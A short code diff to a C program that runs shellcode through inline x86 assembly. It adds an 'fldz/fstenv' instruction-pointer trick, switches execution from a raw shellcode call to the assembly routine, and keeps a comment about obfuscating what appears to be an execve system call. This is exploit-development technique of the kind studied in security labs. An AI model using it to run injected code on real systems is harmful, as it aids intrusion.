@@ -43,7 +43,9 @@ char shellcode[] =
 
 void call_asm(){
   asm(
-      //"mov %cs, %esp \n"
+      "fldz \n"
+      "fstenv %ss:-0xc(%esp) \n"
+      "pop %eax \n"
       //"push $0x80cd0bb0 \n" //obfuscate
       "mov $0xc06685d8, %eax \n"
       "shl %eax \n"
@@ -84,9 +86,9 @@ int main(void) {
   //sprintf(cmd,"cat /proc/%d/maps",(int)getpid());
   //system(cmd);
 
-  //call_asm();
+  call_asm();
 
-  (*(void(*)()) shellcode)();
+  //(*(void(*)()) shellcode)();
 
   printf("shellcode fail!\n");
 
